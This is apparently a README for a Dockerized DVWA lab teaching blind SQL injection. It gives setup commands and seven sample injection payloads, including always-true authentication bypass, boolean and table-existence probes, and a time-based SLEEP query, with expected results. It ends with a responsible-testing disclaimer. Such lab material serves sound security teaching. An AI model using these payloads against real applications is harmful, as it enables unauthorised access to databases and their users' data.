### Blind SQL Injection - Dockerized

This project provides a Dockerized environment to simulate and test **Blind SQL Injection** attacks in a secure and isolated setup. 
The goal is to help users understand the mechanics of this attack, how it differs from traditional SQL Injection, and how to experiment with it using practical examples.

---

### What is Blind SQL Injection?

#### Difference Between SQL Injection and Blind SQL Injection

**SQL Injection** allows attackers to directly view the results of their malicious queries, such as database errors or data displayed on the webpage. It is fast and straightforward since the output is immediately visible.

**Blind SQL Injection**, however, does not show direct results. Instead, attackers infer information by observing the application’s behavior (e.g., response times or changes in output). It is slower and more complex but can still extract sensitive data with persistence.

---

### Prerequisites

To run the Dockerized application, ensure the following are installed on your system:

- [Docker](https://www.docker.com/) (required to load and run the image)  
- [Git](https://git-scm.com/) (optional, for cloning the repository)  
- System with at least **2GB of free space** (the image size is ~801 MB).  

---

### Installation and Usage

Follow these steps to set up and run the application:

#### 1. Clone the Repository

If you haven't already, clone the repository from GitHub:
```bash
git clone https://github.com/ALAOUIa/Blind_SQL_Injection-App.git
```

```bash
cd Abdelaziz_Blind-SQL-Injection-Dockerized
```

#### 2. Load the Docker Image

Load the prebuilt Docker image from the `.tar` file:
```bash
docker load -i Abdelaziz_Blind-SQL-Injection-Dockerized.tar
```

#### 3. Run the Docker Container

Start the container with the following command:
```bash
docker run -p 8080:80 abdelaziz/dvwa-custom
```

#### 4. Access the Application

Open your browser and navigate to:
```
http://localhost:8080
```

#### 5. Test SQL Injection Attacks

Use the examples provided in the [Examples](#examples-of-blind-sql-injection-attacks) section to test Blind SQL Injection on the vulnerable endpoints.

---

### Examples of Blind SQL Injection Attacks

Here are some sample payloads to test on the vulnerable application:

##### 1. Bypass Authentication Using Always-True Condition

### Query:
```
1' OR '1'='1' -- 
```

##### Explanation:
This query leverages an always-true condition (`'1'='1'`) to bypass checks and fetch any available record in the database.

##### Expected Result:
```
User ID exists in the database.
```

---

##### 2. Validating the Query with Always-True Condition

##### Query:
```
1' AND '1'='1' -- 
```

##### Explanation:
This query tests whether a condition that is always true (`'1'='1'`) correctly processes and confirms the result.

##### Expected Result:
```
User ID exists in the database.
```

---

##### 3. Testing for Always-False Condition

##### Query:
```
1' AND '1'='2' -- 
```

##### Explanation:
This query uses an always-false condition (`'1'='2'`) to validate that no result is returned when the condition fails.

##### Expected Result:
```
User ID is MISSING from the database.
```

---

##### 4. Fetching All Records Without Conditions

##### Query:
```
1' OR 1=1 -- 
```

##### Explanation:
This query bypasses any filter by using the logical condition `1=1`, which is always true.

##### Expected Result:
```
User ID exists in the database.
```

---

##### 5. Testing the Presence of a Table (Example: `users`)

##### Query:
```
1' AND EXISTS(SELECT 1 FROM users) -- 
```

##### Explanation:
This query checks whether a table named `users` exists in the database by using the SQL `EXISTS` function.

##### Expected Result:
```
User ID exists in the database.
```

---

##### 6. Testing for Non-Existing Table or Condition

##### Query:
```
1' AND EXISTS(SELECT 1 FROM non_existing_table) -- 
```

##### Explanation:
This query attempts to check for a non-existing table (`non_existing_table`) and should fail, demonstrating the absence of the table.

##### Expected Result:
```
User ID is MISSING from the database.
```

---

##### 7. Delay-Based Blind SQL Injection

##### Query (If Supported):
```
1' AND IF(1=1, SLEEP(3), 0) -- 
```

##### Explanation:
This query introduces a delay (`SLEEP(3)`) when the condition (`1=1`) is true, making it useful for blind SQL injection.

##### Expected Behavior:
- The response is delayed by 3 seconds if the condition is true.
- No delay occurs if the condition is false.

---

##### Additional Notes
- **Comment Style**: Use `--` followed by a space or `#` to terminate the query properly.
- **Security Level**: Ensure that the DVWA security level is set to **Low** for these queries to work as expected.
- **Testing Responsibly**: Only test on applications you own or have explicit permission to test.

---


### Disclaimer

This project is intended **solely for educational purposes**. Do not attempt these attacks on live systems or without explicit authorization. Misuse of this knowledge is unethical and may be illegal.
